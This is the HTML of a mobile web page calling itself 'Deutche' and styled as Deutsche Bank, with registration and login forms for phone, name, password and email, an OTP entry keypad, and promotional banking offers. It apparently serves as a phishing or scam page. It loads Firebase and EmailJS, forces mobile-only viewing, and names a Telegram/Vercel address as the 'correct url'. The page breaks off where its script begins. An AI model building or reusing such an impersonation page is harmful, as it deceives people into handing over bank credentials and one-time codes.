<!DOCTYPE html>
<html lang="en">
<head>
 <!-- intl-tel-input CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css" />

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<!-- intl-tel-input JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
  <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="google" content="notranslate"> 
 <meta name="color-scheme" content="light">
  <title>Deutche</title>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/moment.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/moment-timezone/0.5.43/moment-timezone-with-data.min.js"></script>
 <!-- intl-tel-input CSS (for flags only) -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/css/intlTelInput.min.css" />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,opsz,wght@0,18..144,300..900;1,18..144,300..900&display=swap" rel="stylesheet">
</head>
<body>
 <style>
  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');  
    
     body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      -webkit-user-select: none; /* Safari */
    -moz-user-select: none;    /* Firefox */
    -ms-user-select: none;     /* IE10+/Edge */
    user-select: none;         /* Standard */
      justify-content: center;
      width: 100%;
      height: 100vh;
      margin: 0;
     
    
    }

    .phonecont {
      position: relative;
      
   display: flex;
    }

    .phone-display {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      padding: 10px;
      border-radius: 8px;
      background-color: white;
      
      gap: 2px;
    }

    .dial-code {
      font-weight: bold;
      color: #0fb319;
    }

    .dropdown-container {
      position: absolute;
      top: 0;
      width: 100%;
      height: 100vh;
      background: white;
    
      left: 0;
      
      overflow-y: auto;
      display: none;
      z-index: 10;
    }

    .search-input {
      width: 70%;
      display: block;
      padding: 8px 10px;
      border: 2px solid black;
      border-radius: 8px;
      font-size: 16px;
    }

    .search-input:focus {
      
        border: 2px solid black;
    }
    .dropdown-container2 {
      position: absolute;
      top: 0;
      width: 100%;
      height: 100vh;
      background: white;
    
      left: 0;
      
      overflow-y: auto;
      display: none;
      z-index: 10;
    }

    .search-input2 {
      width: 70%;
      display: block;
      padding: 8px 10px;
      border: 2px solid black;
      border-radius: 8px;
      font-size: 16px;
   position: fixed; 
   top: 2%;
  left: 11%;
    }

    .search-input2:focus {
      outline: none;
      
    }
    .secinput:focus {
      outline: none;
      border: none;
    }

    
 .country-item2 {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 7px 0px;
      width: 92%;
      border-bottom: 0.5px solid #aaa;
    margin-left: 4%;
      }

    .country-item2:hover {
      background-color: #f0f0f0;
    }
    .country-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 7px 0px;
      width: 92%;
      border-bottom: 0.5px solid #aaa;
    margin-left: 4%;
      }

    .country-item:hover {
      background-color: #f0f0f0;
    }

    .country-left {
      display: flex;
      align-items: center;
    }

    .country-name {
      font-weight: bold;
    }

    .iti__flag {
      margin-right: 10px;
      transform: scale(1.1);
    }

    .abbreviation {
      font-weight: bold;
    }

    #countryFullName {
      margin-top: 10px;
      font-size: 16px;
      font-weight: normal;
    }

    .dropdown-icon {
      font-size: 12px;
      margin-left: 2px;
    }
.spinner {
    border: 1.5px solid #f3f3f3;
    border-top: 1.5px solid #1e1e1e;
    border-radius: 50%;
    width: 29px;
    height: 29px;
    animation: spin 0.8s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
.box {
    
    height: 31px;
    
    display: flex;
    justify-content: center;
    align-items: center;
    font-weight: bold;
    font-size: 19.5px;
    border-radius: 5px;
    background-color: #444444;
  }
.phone-display2 {
      display: flex;
      align-items: center;
      
      padding: 10px;
      border-radius: 11px;
      border: none;
      
      gap: 2px;
    }
.toggle-icon {
      position: absolute;
      right: 30px;
      top: 53%;
      transform: translateY(-50%);
      
      width: 24px;
      height: 24px;
    }

    .hidden {
      display: none;
    }
    .firstIn:focus {
      outline: none;
   box-shadow: 0 0 4px 0.5px #0fb319;
    }
 /* Bottom Nav */
    .bottom-nav {
      position: fixed;
      bottom: 0;
      width: 100%;
     background: linear-gradient(to right, #188d31, #21c343); 
      display: flex;
      justify-content: space-around;
      padding: 10px 0;
      z-index: 66;
    }

    .nav-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: darkgreen;
      
      transition: color 0.3s;
  font-weight: bold;
    }

    .nav-item.active {
      color: white;
    }

    .nav-item img {
      width: 24px;
      height: 24px;
      margin-bottom: 4px;
      filter: brightness(0) saturate(100%) invert(16%) sepia(96%) saturate(598%) hue-rotate(88deg) brightness(97%) contrast(89%);
    }

    .nav-item.active img {
      filter: brightness(0) invert(1);
    }

    /* Center Content */
    .content {
      display: none;
      text-align: center;
      
      font-size: 24px;
    }

    .content.active {
      display: block;
    }
  .ticket-button {
      width: 90px;
      height: 45px;
      background: linear-gradient(145deg, #ff00ff, #8000ff);
      position: relative;
      border-radius: 15px;
      box-shadow: inset 0 0 10px rgba(255, 255, 255, 0.1);
    }

    .ticket-button::before,
    .ticket-button::after {
      content: '';
      position: absolute;
      top: 50%;
       width: 10px;
      height: 10px;
      background-color: #535353;
      border-radius: 50%;
      z-index: 2;
    }

    .ticket-button::before {
      left: -3px;
    margin-top: -4px;
    }

    .ticket-button::after {
      right: -3px;
    margin-top: -4px;
    }
  .slider-container {
      width: 90.6%;
      overflow: hidden;
      white-space: nowrap;
      background: #f0f0f0;
     
      margin-left: 8.7%;
   background-color: transparent;
    }

    .slider-text {
      color: #fafafa;
      font-size: 15px;
      display: inline-block;
      padding-left: 100%;
      animation: scroll-text 18s linear infinite;
  padding-bottom: 9px;
    }

    @keyframes scroll-text {
      0% {
        transform: translateX(0);
      
      }
      100% {
        transform: translateX(-100%);
      }
    }
 .slider-container2 {
      width: 90.6%;
      overflow: hidden;
      white-space: nowrap;
      background: #f0f0f0;
     
      margin-left: 8.7%;
   background-color: transparent;
    }

    .slider-text2 {
      color: #fafafa;
      font-size: 15px;
      display: inline-block;
      padding-left: 100%;
      animation: scroll-text 18s linear infinite;
  padding-bottom: 9px;
    }

    @keyframes scroll-text {
      0% {
        transform: translateX(0);
      
      }
      100% {
        transform: translateX(-100%);
      }
    }
 
  .withclass:focus {
      outline: none;
   box-shadow: 0 0 4px 0.5px #0fb319;
    }
  ul {
      
      list-style: none;
      padding: 0;
    }

    li {
      background: transparent;
      padding: 14px;
      border-bottom: 1px solid #ccc;
      
    }

    li div {
      display: flex;
      justify-content: space-between;
    }
    .container43 {
      background-color: #444444;
      border-radius: 12px;
      width: 100%;
      
      color: white;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
    }

    .header43 {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: bold;
    }

    .header-left img,
    .close-btn img,
    .copy-icon img {
      width: 23px;
      height: 23px;
    }

   
    .footer43 {
      margin-top: 15px;
      font-size: 12px;
      color: #ccc;
      text-align: center;
    }

    .footer43 .highlight {
      color: #30d158;
    }

.edit {
font-family: "Merriweather", serif;
  font-optical-sizing: auto;
  font-weight: bold;
  font-style: normal;
  font-variation-settings:
    "wdth" 100;
}
 #otp-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0px 0;
     margin-top: 60%;
        }
        
        .otp-input {
            width: 27px;
            height: 33mpx;
            text-align: center;
            font-size: 24px;
            margin: 0 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            outline: none;
      background-color: #f3f3f3;
     user-select: none;
        }
        
        .otp-input:focus {
            border-color: #4B0082;
        }
        
        .slash {
            font-size: 24px;
            margin: 0 5px;
        }
        
        #message {
            text-align: center;
            font-size: 18px;
            margin-top: 10px;
        }
        /* Keypad Styles */
    #keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      
      background: transparent;
   margin-top: 14%;
   
    }

    .key {
      background: white;
      border: 1px solid #ccc;
      border-radius: 10px;
      padding: 15px;
      font-size: 20px;
      text-align: center;
      cursor: pointer;
      user-select: none;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
   font-family: 'Montserrat', sans-serif;
   font-weight: 600;
    }

    .key:active {
      background: #ddd;
    }

    .wide {
      grid-column: span 2;
    }
  .popup {
    position: fixed;
      width: 95px;
      height: 97px;
      background: #4a4a4a;
      backdrop-filter: blur(10px);
      border-radius: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      transform: scale(0);
      opacity: 0;
      transition: transform 0.3s ease, opacity 0.3s ease;
   top: 45%;
   left: 37%;
  z-index: 9999999999;
    }

    .popup.show {
      transform: scale(1);
      opacity: 1;
    }

    .checkmark {
      width: 90px;
      height: 90px;
      position: relative;
    }

    .checkmark svg {
      width: 90%;
      height: 90%;
      stroke: white;
      stroke-width: 3;
      fill: none;
      stroke-linecap: round;
      stroke-linejoin: round;
      stroke-dasharray: 70;
      stroke-dashoffset: 70;
    }

    .checkmark svg.animate {
      animation: draw 0.6s ease forwards, shake 0.4s ease-in-out 0.8s 1;
    }

    @keyframes draw {
      to {
        stroke-dashoffset: 0;
      }
    }

    @keyframes shake {
      0%   { transform: translateX(0); }
      20%  { transform: translateX(-3px); }
      40%  { transform: translateX(3px); }
      60%  { transform: translateX(-2px); }
      80%  { transform: translateX(2px); }
      100% { transform: translateX(0); }
    }
</style>
<div id="popup" class="popup">
    <div class="checkmark">
      <svg id="tick" viewBox="0 0 52 52">
        <path d="M14 27 L22 35 L38 17" />
      </svg>
    </div>
  </div>

<div id="desmode" style="display: none; position:fixed; top:0; left:0; width:100%; height:100vh; background-color: rgba(0, 0, 0, 0.9); z-index:99999; justify-content:center; align-items:center;">
  <div id="mad60"style="width: 70%; height: auto; display:flex; justify-content:center; align-items:center; background-color: #f6f6e2; border-radius: 9px; font-size: 16px; font-weight: bold; padding: 13px;">
    🚨 Desktop Mode Detected! 🖥️
Please turn off Desktop Mode or kindly open this platform on your mobile device 📱✨
</div>
 </div>


<div id="firstp"style="display: block;">
<div id="earpod"style="width: 100%; height: 100vh; overflow-y: auto; position: relative;  display: none;">
 <div >
   <!-- Loader Overlay -->
<div id="loaderOverlay" style="display: none; position:fixed; top:0; left:0; width:100%; height:100vh; background-color: rgba(0, 0, 0, 0.5); z-index:99999; justify-content:center; align-items:center;">
  <div style="width: 30%; height: 95px; display:flex; justify-content:center; align-items:center; background-color: rgba(0, 0, 0, 0.84); border-radius: 9px;">
    <div class="spinner"></div>
  </div>
 </div>
  


  <div style="position: relative; z-index: 1; padding: 20px;">
 <div id="logsig" style="display: block;">
   <div id="reg1"style="display: block;">
    <div style="position: absolute; opacity: 0;">
  <div id="heret">Here is your unique code to access your account please don't share or forward this code to anyone.</div>  
   
 <div id="bomat">We have implemented these measures as an extra layer of security, which is extremely important to us.</div>  
  <div id="subjectm">Your One-Time Password</div>
 <div id="coppy">© 2025 Deutsche Bank. All rights reserved.</div> 
 <div id="hiii">Hi</div> 
  
    <div id="country"></div>
<div id="language">Nigeria</div></div>
  <div id="pat1" style="font-size: 28px; font-weight: 401; color: white; margin-top: 32%; position: absolute; top: -9%;" class="edit">Welcome To Deutsche!</div> 
    <div id="translate1" style=" font-family: 'Montserrat', sans-serif;font-size: 28px; font-weight: 401; color: white; margin-top: 32%; margin-left:;">Register</div>
    <div id="translate2" style="font-family: 'Montserrat', sans-serif;font-size: 14px; font-weight: 400; color: #e5e5e5; margin-top: 6%; margin-left: ;">Create your account</div>
</div>
  
   <div id="log1" style="display: none; position: absolute; width: 90%; top: 14%;">
  <div id="goback"style="position: absolute; margin-top: -16%;">
    <img style ="width: 20px; height: 20px; padding: 8px; background: #c4c4c4; border-radius: 50%; text-align: center; align-items: center; justify-content: center; color: transparent;" src="https://img.icons8.com/?size=100&id=60636&format=png&color=000000" alt="">  
  </div>
  
    <div id="pat2" style="font-family: 'Montserrat', sans-serif;font-size: 28px; font-weight: 401; color: white; margin-top: 5%;">Sign in to your Account</div>
    <div id="add4" style="font-size: 14px; font-weight: 400; color: #e5e5e5; margin-top: 2%; font-family: 'Montserrat', sans-serif;">Create your account</div>
</div>
    
    <!-- Hidden translation content -->
    <div style="position: absolute; top: 0; opacity: 0; display: none;">
  
      
     
      <input type="password" id="transPassword" placeholder="Confirm password Text" /><br><br>
    </div>
<div id="log2"style="margin-top: 65%;">
<div style="display: flex; margin-top: 14%;">
    <img style="width: 20px; height: 20px; " src="https://img.icons8.com/?size=100&id=fnQivuIylSo3&format=png&color=4B0082" alt=""><span id="pat3" style="font-family: 'Montserrat', sans-serif;color: #333; font-weight: bold;margin-left: 0.5%; font-size: 15px;">Phone Number</span>
</div>

<div style="background-color: #171717f0; margin-top: 1%;" class="phone-display2" >
   <span style="display: flex;"id="dropdownToggle2">
    <div style="position: absolute; margin-top: 1.3%;"id="selectedFlag2" class="iti__flag iti__us"></div>
   
    <span id="selectedCode2" class="dial-code" style="color: #ededed; margin-left: 28px;"></span>
    <span style="color: white;"class="dropdown-icon">▼</span>
</span>
 <span style="font-size: 23px; font-weight: bold; color: white;">|</span>
 <div >
 <input id="mobile" class="secinput"style="width: 97%; font-size: 15.5px; font-weight: bold; border: none; background-color: transparent; color: #ededed;" type="number" placeholder="Please enter phone number">
 </div>
 </div>
   <div class="dropdown-container2" id="countryDropdown2">
    <input type="text" id="searchBox2" class="search-input2" placeholder="Search Country">
    <div style="margin-top: 13%;" id="countryList2"></div>
  </div>
  </div>
  <div id="reg2" style="display: block;" >
   <div>
    <div style="display: flex; margin-top: 7%;">
    <img style="width: 20px; height: 20px; " src="https://img.icons8.com/?size=100&id=11779&format=png&color=4B0082" alt=""><span id="pat4" style="font-family: 'Montserrat', sans-serif;color: #333; font-weight: bold;margin-left: 0.5%; font-size: 15px;">Full Name</span>
</div>

    <input id="fullname"class="firstIn" style="width: 91%; height: 41px; background-color: #171717f0; border-radius: 11px; font-weight: bold; color: #ededed; border: none; margin-top: 0.5%; font-size: 15.8px; padding: 0px 14px;" type="text"  placeholder="Please enter full name" />
   
    </div>
  
   <div>
   <div style="display: flex; margin-top: 7%;">
    <img style="width: 20px; height: 20px; " src="https://img.icons8.com/?size=100&id=85161&format=png&color=4B0082" alt=""><span style="font-family: 'Montserrat', sans-serif;color: #333; font-weight: bold;margin-left: 0.5%; font-size: 15px;" id="pat5">Set Password</span>
</div>
    
    <input id="setpassword"class="firstIn" style="width: 91%; height: 41px; background-color: #171717f0; border-radius: 11px; font-weight: bold; color: #ededed; border: none; margin-top: 0.5%; font-size: 15.8px; padding: 0px 14px;"type="password"  placeholder="Please enter password" />
 
 <img style="top: 65.4%;"
      id="openEye2"
      class="toggle-icon"
src="https://img.icons8.com/?size=100&id=85130&format=png&color=b9b9b9"
     />
    <img style="width: 21px; height: 21px; top: 65.4%;"
      id="closedEye2"
      class="toggle-icon hidden"
src="https://img.icons8.com/?size=100&id=59814&format=png&color=b9b9b9"
      />
   </div>
 <div style="display: flex; margin-top: 7%;">
    <img style="width: 20px; height: 20px; " src="https://img.icons8.com/?size=100&id=hiHefYoRpYRb&format=png&color=4B0082" alt=""><span  id="pat6"style="font-family: 'Montserrat', sans-serif;color: #333; font-weight: bold;margin-left: 1%; font-size: 15px;">Email Address</span>
</div> 
  <input id="email" class="firstIn" style="width: 91%; height: 41px; background-color: #171717f0; border-radius: 11px; font-weight: bold; color: #ededed; border: none; margin-top: 0.5%; font-size: 15.8px; padding: 0px 14px; text-transform: lowercase;"type="text"  placeholder="Please enter email" />  
  
    <div style="text-align: center; align-items: center; justify-content: center;">
    <button id="pat7" style="font-family: 'Montserrat', sans-serif;width: 91%; height: 41px; background: linear-gradient(to right, #4B0082, #490082a5); border-radius: 11px; font-weight: bold; color: #ededed; border: none; margin-top: 13%; font-size: 16.8px; padding: 0px 14px;" onclick="registerUser()">Register</button>
    </div>
 
   <div style="text-align: center; align-items: center; justify-content: center; margin-top: 4%;">
      <span id="pat8"style="font-family: 'Montserrat', sans-serif;font-size: 15.5px; color: #1e1e1e; font-weight: bold;"> I already have an account?</span> <span id="logClick"style="font-family: 'Montserrat', sans-serif;font-size: 15.5px; color: #1e1e1e; font-weight: bold; color: #4B0082;">Login</span>
   </div>
   </div>
    <div id="log3" style="display: none;">
     <div>
    <div style="display: flex; margin-top: 7%;">
    <img style="width: 20px; height: 20px; " src="https://img.icons8.com/?size=100&id=85161&format=png&color=4B0082" alt=""><span id="pat9" style="font-family: 'Montserrat', sans-serif;color: #333; font-weight: bold;margin-left: 0.5%; font-size: 15px;">Password</span>
</div>

    <input id="passwordLogin"class="firstIn" style="width: 91%; height: 41px; background-color: #171717f0; border-radius: 11px; font-weight: bold; color: #ededed; border: none; margin-top: 0.5%; font-size: 15.8px; padding: 0px 14px;" type="password"  placeholder="Please enter password" />
 
   <img style="margin-top: 23.9%;"
      id="openEye3"
      class="toggle-icon"
src="https://img.icons8.com/?size=100&id=85130&format=png&color=b9b9b9"
     />
    <img style="width: 21px; height: 21px; margin-top: 23.9%;"
      id="closedEye3"
      class="toggle-icon hidden"
src="https://img.icons8.com/?size=100&id=59814&format=png&color=b9b9b9"
      />
    </div>
  <div style="text-align: center; align-items: center; justify-content: center;">
    <button id="pat10" style="width: 91%; height: 41px; background: linear-gradient(to right, #4B0082, #490082a5); border-radius: 11px; font-weight: bold; color: #ededed; border: none; margin-top: 13%; font-size: 16.8px; padding: 0px 14px;" onclick="loginUser()">Login</button>
    </div>
 
   <div style="text-align: center; align-items: center; justify-content: center; margin-top: 4%;">
      <span id="pat11"style="font-family: 'Montserrat', sans-serif;font-size: 15.5px; color: #1e1e1e; font-weight: bold;"> I already have an account?</span> <span id="regClick"style="font-family: 'Montserrat', sans-serif;font-size: 15.5px; color: #1e1e1e; font-weight: bold; color: #4B0082;">Register</span>
   </div>
    </div>
<div id="valid" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%,-50%);display: flex;justify-content: center;align-items: center;text-align: center; display: none;">
<p id="pat12" style="padding: 10px 14px;background-color: rgba(0, 0, 0, 0.84);border-radius: 9px;font-size: 15px;color: #d6d6d6;box-shadow: 0 0 4px 0.5px #1e1e1e;">Please enter a valid number</p>
</div>

 
 <div id="valid3" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%,-50%);display: flex;justify-content: center;align-items: center;text-align: center; display: none;">
<p id="pat14" style="padding: 10px 14px;background-color: rgba(0, 0, 0, 0.84);border-radius: 9px;font-size: 15px;color: #d6d6d6;box-shadow: 0 0 4px 0.5px #1e1e1e;" >Incorrect Password</p>
</div>

 <div id="valid4" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%,-50%);display: flex;justify-content: center;align-items: center;text-align: center; display: none;">
<p id="pat15"style="padding: 10px 14px;background-color: rgba(0, 0, 0, 0.84);border-radius: 9px;font-size: 15px;color: #d6d6d6;box-shadow: 0 0 4px 0.5px #1e1e1e;" >User Already Exists Please Login</p>
</div>
<div id="valid5" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%,-50%);display: flex;justify-content: center;align-items: center;text-align: center; display: none;">
<p id="erroremail"style="padding: 10px 14px;background-color: rgba(0, 0, 0, 0.84);border-radius: 9px;font-size: 15px;color: #d6d6d6;box-shadow: 0 0 4px 0.5px #1e1e1e;" >Unable To Send Code To Your Email Please Check Email And Try Again</p>
</div>
<div id="valid6" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%,-50%);display: flex;justify-content: center;align-items: center;text-align: center; display: none;">#
<p id="allfield"style="padding: 10px 14px;background-color: rgba(0, 0, 0, 0.84);border-radius: 9px;font-size: 15px;color: #d6d6d6;box-shadow: 0 0 4px 0.5px #1e1e1e;" >Please Fill All Fields</p>
</div>
</div>
<div id="otppage"style="display: none;">
<div id="valid2" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%,-50%);display: flex;justify-content: center;align-items: center;text-align: center; display: none;">
<p id="pat13"style="padding: 10px 14px;background-color: rgba(0, 0, 0, 0.84);border-radius: 9px;font-size: 15px;color: #d6d6d6;box-shadow: 0 0 4px 0.5px #1e1e1e;">Incorrect OTP code</p>
</div>
<div style="width: 100%;">
<div id="goback3"style="position: absolute; top: 6%;">
    <img style ="width: 20px; height: 20px; padding: 8px; background: #c4c4c4; border-radius: 50%; text-align: center; align-items: center; justify-content: center; color: transparent; " src="https://img.icons8.com/?size=100&id=60636&format=png&color=000000" alt="">  
  </div>

<div style="width: 85%; align-items: center; justify-content: center; text-align: center;  ">
 <img style="width: 53px; height: 53px; position: absolute; top: 9%; " src="https://img.icons8.com/?size=100&id=Kp3rKjBdoB5B&format=png&color=fbfbfb" alt="">
 </div>
 <div style="font-family: 'Montserrat', sans-serif; width: 100%; text-align: center; justify-content: center; font-size: 23px;margin-top: 35%; color: white; font-weight: 600; "><span id="grant">Verification Code</span></div>
</div>
<div style="font-family: 'Montserrat', sans-serif; width: 100%; text-align: center; justify-content: center; font-size: 17px;margin-top: 15%; color: #333; position: absolute; width: 89%;"><span id="grantt">Please check your email inbox for the OTP code we just sent. Enter the code below to proceed.</span></div>
 <div id="otp-container">
    <input id="gass1" inputmode="none" maxlength="1" class="otp-input">
    <input id="gass2"inputmode="none" maxlength="1" class="otp-input">
    <input id="gass3"inputmode="none" maxlength="1" class="otp-input">
    <span class="slash">-</span>
    <input id="gass4"inputmode="none" maxlength="1" class="otp-input">
    <input id="gass5"inputmode="none" maxlength="1" class="otp-input">
    <input id="gass6"inputmode="none" maxlength="1" class="otp-input">
  </div>
  
    <div style="position: absolute;"id="message"></div>
<div id="keypad">
    <div class="key">1</div>
    <div class="key">2</div>
    <div class="key">3</div>
    <div class="key">4</div>
    <div class="key">5</div>
    <div class="key">6</div>
    <div class="key">7</div>
    <div class="key">8</div>
    <div class="key">9</div>
    <div class="key wide">0</div>
    <div class="key">×</div>
    
  </div>
  </div>

</div>
<!-- Custom Keypad -->
  

 <img style="width: 100%; height: auto; position: absolute; top: 0;" src="https://res.cloudinary.com/drdylgyq3/image/upload/v1755620946/uploads/stwocyjk19tnc0ax1xhs.jpg" alt="">
 
  
</div>
</div>
 <div id="condis" style="width: 99.5%; height: 60%; border: 1px solid black; display: none;">
     <div id="numdis"></div>
 <div id="firebasepassword"></div>
 <div id="contdis"></div>
  <div id="conttim"></div>
 </div>
<div id="realpage">
 <div style="width: 100%; height: 9.5%; border: 1px solid white; position: fixed; top: 0; left: 0; z-index: 2; background: #4B0082;">
       <img style="width: 16%; height: 53px; margin-left: 1.6%; margin-top: 1.5%;" src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757090854/uploads/iojmziytvxixw0igafm9.png" alt="">
  <div id="opreg7" style="font-family: 'Montserrat', sans-serif; padding: 6px 12px; border: 1px solid white; color: white; position: absolute; top: 10px; right: 4%; border-radius: 19px; font-weight: 600; "><span>Register</span></div>
   </div>
  <div style="width: 100%; height: 98%; overflow-y: auto; position: absolute;">
  <div style="background: #4B0082;">
   <div style="width: 100%;">
    <div  style="position: absolute; margin-top: 20%; z-index: 1; font-size: 13px; text-align: center; align-items: center; justify-content: center; font-weight: 400; "><span id="tan1">Please check that you are visiting the correct url </span> <span style="font-family: 'Montserrat', sans-serif; color: green; font-weight: 700;">https://t.me/muhaluxe.vercel.app</span></div> 
       <img style="width: 100%; height: auto; margin-top: 19%;"src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757090912/uploads/v2zlsqfmvdp5inzx8gk1.jpg" alt="">
  </div>
  <div id="tan2" style=" font-family: 'Montserrat', sans-serif;color: white; text-align: left; padding: 2%; font-size: 27px; line-height: 1.5; font-weight: 700;">
      Your banking experience will be even more convenient starting August 25. Look forward to the upgrade!
  </div>
   </div>
   <div style="position: absolute; text-align: center; align-items: center; justify-content: center;">
     <div style="padding: 4%;">
       <div id="tan3" style=" font-family: 'Montserrat', sans-serif;color: #4B0082; font-size: 27px; padding-top: 6%; font-weight: 700;">Top offers</div>
  
   <img style="width: 100%; height: auto; margin-top: -1%;" src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757090987/uploads/i0j6abmal43ndg76rt7y.jpg" alt="">
 <div style="height: auto; background: #4B0082; text-align: left; margin-top: -2%;">
 <div style="font-family: 'Montserrat', sans-serif;font-size: 19px; color: white; padding-top: 2%; padding-left: 2%; font-weight: 700;">2.0% <span id="tan4">per interest with fixed interest savings for 12 months</span></div>
  <div id="tan5"style="font-family: 'Montserrat', sans-serif;font-weight: 400; font-size: 15px; color: #f5f5f5; padding-left: 2%; padding-top: 4%;">Get the interest feeling.</div>
   <div id="opreg6" style="font-family: 'Montserrat', sans-serif;color: white;   font-weight: 600; margin-left: 2%; width: auto; padding-top: 8%; padding-bottom: 7%;"><span id="tan6" style="border: 1px solid white; padding: 6px 12px; border-radius: 19px;">Register</span></div>
   </div>
  
  <img style="width: 100%; height: auto; margin-top: 4.8%;" src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757091056/uploads/e3pdk1mja03il6dm7qgj.png" alt="">
 <div style="height: auto; background: #4B0082; text-align: left; margin-top: -2%;">
 
  <div id="tan7" style="font-family: 'Montserrat', sans-serif;font-weight: 400; font-size: 15px; color: #f5f5f5; padding-left: 2%; padding-top: 4%;">Online Depot</div>
   <div style="font-family: 'Montserrat', sans-serif;font-size: 19px; color: white; padding-top: 2%; padding-left: 2%; font-weight: 700;"><span id="tan8">Maxblue the free online depot</span></div>
   <div id="opreg3" style="color: white;   font-weight: 600; margin-left: 2%; width: auto; padding-top: 8%; padding-bottom: 7%;"><span id="tan9"style="font-family: 'Montserrat', sans-serif;border: 1px solid white; padding: 6px 12px; border-radius: 19px;">Discover now</span></div>
   </div>
  <img style="width: 100%; height: auto; margin-top: 5%;" src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757091210/uploads/em4xn6zmitgqklwzdu4b.png" alt="">
 <div style="height: auto; background: #4B0082; text-align: left; margin-top: -2%;">

  <div id="tan10"style="font-family: 'Montserrat', sans-serif;font-weight: 400; font-size: 15px; color: #f5f5f5; padding-left: 2%; padding-top: 4%;">Maxblue savings plan</div>
  <div style="font-family: 'Montserrat', sans-serif;font-size: 19px; color: white; padding-top: 2%; padding-left: 2%; font-weight: 700;"><span id="tan11">Invest in the stock market form just 20 dollars a month</span></div>
   <div id="opreg4"style="color: white;   font-weight: 600; margin-left: 2%; width: auto; padding-top: 8%; padding-bottom: 7%;"><span id="tan12"style="font-family: 'Montserrat', sans-serif;border: 1px solid white; padding: 6px 12px; border-radius: 19px;">Register</span></div>
   </div>
   <img style="width: 100%; height: auto; margin-top: 5%;" src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757091307/uploads/sdhqdyyzjqyqcajuqovq.png" alt="">
 <div style="height: auto; background: #4B0082; text-align: left; margin-top: -2%;">
<div id="tan14"style="font-family: 'Montserrat', sans-serif;font-weight: 400; font-size: 15px; color: #f5f5f5; padding-left: 2%; padding-top: 4%;">Construction financing
</div>
  
  <div style="font-family: 'Montserrat', sans-serif;font-size: 19px; color: white; padding-top: 2%; padding-left: 2%; font-weight: 700;"><span id="tan15">Feel more at home</span></div>
  <div id="tan16"style="font-family: 'Montserrat', sans-serif;font-weight: 400; font-size: 15px; color: #f5f5f5; padding-left: 2%; padding-top: 4%;">Possible with our construction financing, which adapts to your life situation.

</div>
   <div id="opreg5" style="color: white;   font-weight: 600; margin-left: 2%; width: auto; padding-top: 8%; padding-bottom: 7%;"><span id="tan17"style="font-family: 'Montserrat', sans-serif;border: 1px solid white; padding: 6px 12px; border-radius: 19px;">Discover now</span></div>
   </div>
   <div id="tan18"style="font-family: 'Montserrat', sans-serif;color: #4B0082; font-size: 27px; padding-top: 6%; font-weight: 700;">Why Deutsche Bank</div>
  
  <img style="width: 70px; height: 55px; padding-top: 10%;"src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757091397/uploads/drnklego4hs1bwxchqt7.jpg" alt="">
   <div id="tan19"style="font-family: 'Montserrat', sans-serif;color: #4B0082; font-size: 17px; padding-top: 10%; font-weight: 700;">Personal advice and support</div>
 
  <img style="width: 65px; height: 55px; padding-top: 10%;"src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757091515/uploads/stpgwhtdxkij4cbuonrh.jpg" alt="">
   
    <div id="tan20"style="font-family: 'Montserrat', sans-serif;color: #4B0082; font-size: 17px; padding-top: 10%; font-weight: 700;">Global investment expertise</div>
   <img style="width: 65px; height: 55px; padding-top: 10%;"src="https://res.cloudinary.com/drdylgyq3/image/upload/v1757091570/uploads/tmoay1pefpb6zqor7ztr.jpg" alt=""> 
     
      <div id="tan21"style="font-family: 'Montserrat', sans-serif;color: #4B0082; font-size: 17px; padding-top: 10%; font-weight: 700;">Innovative online banking</div>
 </div>
  <div id="tan22"style="font-family: 'Montserrat', sans-serif;width: 100%; background: #4B0082; font-weight: 600; font-size: 19px;  color: white; padding-top: 3%; padding-bottom: 3%;">With deep dedication</div>
   </div> 
     
     </div> 
   
    </div> 
  </div>
    </div>
</div>
 
  <iframe id="iframe" src="" style="width: 100%; overflow-y: scroll; height: 100%; border: none ; top: 0; position: fixed;  left: 0; display: none;"></iframe>
     
  <script>
function detectDesktopMode() {
